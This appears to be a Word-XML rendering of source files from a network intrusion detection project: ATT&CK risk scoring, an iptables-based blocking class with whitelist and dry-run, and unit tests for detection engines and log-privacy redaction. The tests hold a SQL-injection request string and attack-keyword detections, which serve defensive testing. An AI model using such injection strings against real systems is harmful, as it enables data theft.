      </w:r>
    </w:p>
    <w:p w14:paraId="26B86C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"unknown"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C2E02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2CCB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8702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risk_score(kind, confidence=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F8919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"""Blend the technique base score with engine confidence -&gt; 0.0..10.0.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="499A27C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F3F4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technique's base score is the ceiling for that class of attack; engine</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F050B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confidence scales it down to 70% at worst. A low-confidence hit on a severe</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F9A62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technique therefore still outranks a confident low-severity hit, and no</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40CBDA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score saturates at the top of the scale.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6799F1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17C2CE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base = TECHNIQUES.get(kind, TECHNIQUES["unknown"])["base_score"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2766D8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confidence is None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F7D5D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round(base, 1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7775DB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7F6D64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 = max(0.0, min(1.0, float(confidence)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22B6CF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(TypeError, ValueError):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A3EC6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round(base, 1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35627A9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scaled = base * (0.7 + 0.3 * c)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E06D7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round(max(0.0, min(10.0, scaled)), 1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="077E0E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F3659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8DFC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enrich(message, confidence=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="371D54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"""Return full ATT&amp;CK context for an alert message.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B4F12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954B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returned dict is embedded in the CSV audit log, the JSON UDP telemetry</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="317242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frame, the web dashboard and the forensic HTML report, so every output</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="076D64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surface carries the same threat framing.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AC544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4CF49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kind = classify_kind(message)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D8E05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meta = TECHNIQUES.get(kind, TECHNIQUES["unknown"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C6DAE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{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06CAE9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"kind": kind,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="315DEE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"technique_id": meta["id"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B8908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"technique": meta["name"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5308AF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"tactic": meta["tactic"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F50FE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"tactic_id": meta["tactic_id"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="313F1B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"severity": meta["severity"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D0963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"engine": meta["engine"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C2CA0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"risk_score": risk_score(kind, confidence),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67082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"reference": ("https://attack.mitre.org/techniques/%s/"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FA285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% meta["id"].replace(".", "/")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58F99B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if meta["id"] != "N/A" else ""),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ADD25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}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1105019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81AC78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64B5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08AF9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m in [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E88D6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"DDoS DETECTED! Z-Score: 4.21 (PPS: 8500)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72914D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"PORT SCAN DETECTED! (Unique Ports: 44/sec)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B4FE9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"MALICIOUS PAYLOAD! Keywords: ['UNION', 'SELECT']",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53AA97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"MALICIOUS PAYLOAD! Keywords: ['SCRIPT', 'ALERT(']",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="527FA5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"BLACKLISTED IP DETECTED: 10.0.0.66 (Flagged)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05F78A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"ANOMALY DETECTED (Cluster 2)! Suspicious activity.",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="049570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]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74024E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enrich(m, confidence=0.95)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1780FF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print("%-9s %-10s %-38s risk=%.1f" %</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AD14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(e["kind"], e["technique_id"], e["technique"], e["risk_score"]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AAC3C8F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src/utils/active_defense.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C9C331C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(106 lines)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F6187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4BAB1E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subprocess</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EC863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9664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CA7DD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ActiveDefense:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EFBB7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"""Inserts iptables DROP rules for source addresses the engines flag.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19B7E6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1B2E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The rule is inserted with `-I INPUT 1` so it sits at the head of the chain</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10C984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and therefore wins over any ACCEPT rule already present; appending it would</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DE42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leave it unreachable on a host whose policy accepts established traffic</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54E164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early.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65DA2E7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345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Whether this class is ever asked to act is decided by the AlertDispatcher</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39D31D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under the NFR-3 opt-in policy - constructing it has no side effects, so the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="732379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sensor can always build one and simply never enable blocking.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="330989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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FE395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DBBE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__init__(self, whitelist=None, dry_run=False):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11167D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self.blocked_ips = set()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26D183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never block ourselves, whatever an engine decides</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EA178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self.whitelist = list(whitelist) if whitelist else ["127.0.0.1",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="239351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            "0.0.0.0"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65B0C4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self.dry_run = dry_run</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="496938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self.failures = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64B468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active defense ready (whitelist: %s%s)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="781B30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% (", ".join(self.whitelist), ", dry-run" if dry_run else ""))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46292B0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65B0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_iptables_available(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C1F8E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os.name != "nt" and hasattr(os, "geteuid")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21B561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572E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block_ip(self, ip):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19A8FE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ip in self.whitelist or ip in self.blocked_ips:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="033929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430596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6AD3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not self._iptables_available():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="455174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[!] iptables unavailable on this platform - skipping")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60E3DC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209ADC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01B1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os.geteuid() != 0:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="597735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[!] can't block - need root for iptables")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D4FE3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0CCE29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09BB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self.dry_run:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C7A61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[dry-run] would block %s" % ip)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DED5B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self.blocked_ips.add(ip)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15E96F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37662E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0472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print("[*] blocking", ip)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="539CAE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CE78D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-I INPUT 1 puts the rule at the top so it wins</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A1FEA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subprocess.run(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="556EC4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["iptables", "-I", "INPUT", "1", "-s", ip, "-j", "DROP"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="157B36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check=True,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32F315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)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="329312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self.blocked_ips.add(ip)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F47AF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[+] blocked")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C11A9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1CAD1C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382B6F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self.failures += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75685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[!] block failed:", e)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F2579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1BB659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A636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unblock_ip(self, ip):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C92B5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ip not in self.blocked_ips:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13439F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244224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self.dry_run:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="186C49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self.blocked_ips.discard(ip)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D5CE3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3F9D61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13AAE2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subprocess.run(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DACEC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["iptables", "-D", "INPUT", "-s", ip, "-j", "DROP"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E023D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check=True,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06ED70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)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DF133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self.blocked_ips.discard(ip)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0952F6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[+] unblocked", ip)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EBAC2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True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DD539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except Exception as e:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="280E5B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   [!] unblock failed:", e)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49D33F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return False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48480B5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EE8C5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flush(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12E6F9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"""Remove every rule this process inserted.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41FDFF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8385D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Called on shutdown so a demonstration leaves the host's firewall in the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="357375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state it was found in, rather than requiring the operator to remember</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="295FB1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which addresses were dropped.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="571F99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"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="724049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removed = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="276071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list(self.blocked_ips):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A0025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self.unblock_ip(ip):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32BD08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removed += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18EB22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removed:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F93CC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print("[*] removed %d MANTIS firewall rule(s)" % removed)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="341505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removed</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25868BA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A8FB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active_rules(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EBA03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sorted(self.blocked_ips)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31180CB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ADAE7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0BC6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4ACEEF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# dry-run so running this file never touches the real firewall</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FD7D3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 = ActiveDefense(dry_run=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15E93F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print(d.block_ip("10.0.0.66"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3038D1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print(d.block_ip("127.0.0.1"), "(whitelisted)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ECCF9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print("active:", d.active_rules())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68800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d.flush()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12C344E8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Automated Test Suite</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="683736FE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src/tests/test_engines.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2945AFC0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(113 lines)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71742D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unit tests for the detection engines (no root, no sockets)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="110DA4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537847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485EE3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unittest</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B4359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BF95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0DCB4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SRC = os.path.dirname(HERE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B7637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113D0A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6DCDEB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DCEA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bloom, kmeans, knn, naive_bayes, z_score</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="292F2CE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DA304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79BF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TestZScore(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BBAFA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test_constant_traffic_has_zero_stddev(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F30C7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z_score.MinimalistStats(window_size=10)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D69DE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range(10):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="718E1C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e.update(20)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73F7AB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m, s = e.calculate_baseline()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F68EE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self.assertAlmostEqual(m, 20.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="779679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self.assertAlmostEqual(s, 0.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62C642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ADEF2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test_spike_triggers_high_z(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0611FB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z_score.MinimalistStats(window_size=10)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AEA06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range(9):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F132A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e.update(10)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D4232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e.update(11)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F8C04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m, s = e.calculate_baseline()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="099E0A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z = (500 - m) / s if s &gt; 0 else 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EFCC3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self.assertGreater(z, 3.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11E3BA9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87A378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B210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TestKNN(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="512A88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67B3BF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 = knn.KNNMonitor(k=3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75B5811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25E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test_normal_browsing(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CE63E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v, _ = self.e.classify(2, 12)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27EA45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self.assertEqual(v, "Normal")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="618338A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2177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test_aggressive_scan(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58F8D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v, _ = self.e.classify(400, 800)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D7E96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self.assertEqual(v, "Scan")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C6B18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876B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test_export_import_round_trip(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D280B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snap = self.e.export_brain()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="145E1D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fresh = knn.KNNMonitor(k=3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="799AA2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fresh.training_data = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C59F2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fresh.import_brain(snap)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61A6E0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self.assertEqual(len(fresh.training_data),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59FC35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len(self.e.training_data))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BA108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BCCE8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0FE5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TestNaiveBayes(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FEAC5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7CAFA2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 = naive_bayes.PayloadMonitor()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="790810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809A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test_normal_http_is_safe(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71C4F2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v, _, _ = self.e.classify(b"GET /index.html HTTP/1.1")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B87E4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self.assertEqual(v, "Safe")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17429B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6201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test_sqli_is_malicious(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57EC7F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v, conf, words = self.e.classify(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26F468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b"GET /?id=1 UNION SELECT password FROM users --")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="094EB3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self.assertEqual(v, "Malicious")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B4A79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self.assertGreaterEqual(conf, 0.80)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="631FDD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self.assertIn("UNION", words)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="587C82D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B554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test_admin_alone_is_never_malicious(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3666EC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Simulate an overconfident imported model like the one that caused</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2593E8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duplicate ADMIN alerts in the live dashboard.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="364A22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self.e.prior_malicious = 0.5</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="550A34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self.e.prior_safe = 0.5</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="039F41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self.e.likelihoods = {"ADMIN": (0.99, 0.01)}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F96F3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verdict, confidence, words = self.e.classify(b"GET /admin HTTP/1.1")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D0228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self.assertGreater(confidence, 0.80)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46CCEC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self.assertEqual(words, ["ADMIN"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EABA1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self.assertEqual(verdict, "Safe")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5965B9B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9396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test_export_import_round_trip(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F0921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snap = self.e.export_brain()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C5148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fresh = naive_bayes.PayloadMonitor()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="656093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fresh.import_brain(snap)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44F998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self.assertEqual(fresh.prior_malicious, self.e.prior_malicious)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="364B31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self.assertEqual(set(fresh.likelihoods), set(self.e.likelihoods))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DC8CB9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381BA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8AAD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TestKMeans(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D29A9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def test_returns_valid_cluster(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3261B9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kmeans.KMeansMonitor(k=3, learning_rate=0.05)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A16A8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self.assertIn(e.classify(10, 2), (0, 1, 2))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="023C2B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705F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test_centroid_moves_after_observation(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4707D7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kmeans.KMeansMonitor(k=3, learning_rate=0.5)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12D94F8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before = list(e.centroids[0])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35CD88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e.classify(20, 4)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28FB4E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self.assertNotEqual(before, e.centroids[0])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BF6CC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052C5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825D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TestBloom(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6758E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test_added_item_found(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5909FA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bloom.BloomFilter(size=200, hash_count=3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ED8FA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bf.add("10.0.0.5")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="150503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self.assertTrue(bf.check("10.0.0.5"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C6EA87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416F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test_unknown_item_not_found(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="354E9B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bloom.BloomFilter(size=200, hash_count=3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23B5D2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bf.add("10.0.0.5")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11659F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self.assertFalse(bf.check("8.8.8.8"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02B329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402E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3DBA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2E2434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unittest.main(verbosity=2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DEF452D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src/tests/test_modules.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F3D9BA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(476 lines)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19881F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162DF5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"""Unit tests for the supporting modules and the algorithmic corrections.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C2A54D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0579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Covers the parts of the system that are not detection engines themselves but</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="100388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that the requirements depend on:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="729971C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AF4E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utils.privacy   NFR-3 / DPA 2018 data minimisation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77733C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utils.pcap      libpcap encoding and decoding</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AEA9D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utils.mitre     ATT&amp;CK mapping and risk scoring</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35B282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utils.config    configuration precedence, opt-in defaults</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C463C3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8145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plus regression tests for the three algorithmic defects found while building</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="736657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replay harness: Z-Score baseline poisoning, KNN feature scaling and</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="383953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K-Means novelty detection.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A4628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4088C06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49DF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math</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="021982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27A864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shutil</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="021B69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70AD70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tempfile</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48B4AD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unittest</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5666CD8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E8BC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3BA63D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7397F5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27A0D5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602011D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5A53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utils.mitre as mitre</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29481D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4EB331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utils.privacy as privacy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B6F83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engines import bloom, kmeans, knn, z_score</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1006ED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utils.config import Config</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74E420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EC0C8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D092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TestPrivacy(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="008E4D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test_excerpt_truncated_to_64_bytes(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E4C2C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NFR-3 states payload excerpts are truncated to 64 bytes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B4AB7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long_payload = b"A" * 500</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C7F87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self.assertEqual(len(privacy.payload_excerpt(long_payload, limit=64)),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="437913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64)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16FBE2B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359A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test_email_is_redacted(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B6537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privacy.payload_excerpt(b"contact=alice@example.com", limit=200)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1518A0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self.assertNotIn("alice@example.com", out)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CE3B9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self.assertIn("EMAIL_REDACTED", out)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="775191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39D9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test_password_and_token_are_redacted(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="396A87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privacy.payload_excerpt(b"password=hunter2&amp;api_key=sk_live_99",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46CFE1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limit=200)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="300AA8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self.assertNotIn("hunter2", out)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23EBDE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self.assertNotIn("sk_live_99", out)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AB80F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3320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test_card_number_is_redacted(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E60AF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privacy.payload_excerpt(b"card=4111111111111111", limit=200)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E31A8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self.assertNotIn("4111111111111111", out)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="622321F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DBE4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test_control_bytes_cannot_reach_the_log(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26CB1A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log-injection defence: escapes and newlines become '.'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58BFE0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privacy.payload_excerpt(b"a\x1b[31mred\x00\nb", limit=64)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54079E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self.assertNotIn("\x1b", out)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4363D5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self.assertNotIn("\n", out)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67FE63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self.assertNotIn("\x00", out)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2528D2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2596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test_privacy_mode_off_keeps_content(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F122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out = privacy.payload_excerpt(b"password=hunter2", limit=64,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="777DCC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privacy_mode=False)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="302180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self.assertIn("hunter2", out)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="103B75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2600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test_ip_anonymisation_masks_host_octet(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50FA48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self.assertEqual(privacy.anonymise_ip("192.168.1.57"), "192.168.1.0")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CAC5E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disabled by default when the flag is off</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BC4F8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self.assertEqual(privacy.anonymise_ip("192.168.1.57", False),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E7BA3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"192.168.1.57")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="682BE75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56F3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test_non_ipv4_input_is_left_alone(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DD7FC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self.assertEqual(privacy.anonymise_ip("not-an-ip"), "not-an-ip")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41FB9FD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30B8F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3430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TestPcap(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A241A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660FAD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self.tmp = tempfile.mkdtemp()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="027503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self.path = os.path.join(self.tmp, "t.pcap")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E1339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9BAA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tearDown(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48EA19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shutil.rmtree(self.tmp, ignore_errors=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57D55B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1D2F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test_write_then_read_round_trip(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DB641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frames = [b"\xaa" * 60, b"\xbb" * 74, b"\xcc" * 128]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23FA34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pcap.PcapWriter(self.path) as w:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50C728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i, f in enumerate(frames):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0366ED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w.write(f, ts=1700000000 + i)</w:t>
      </w:r>
    </w:p>
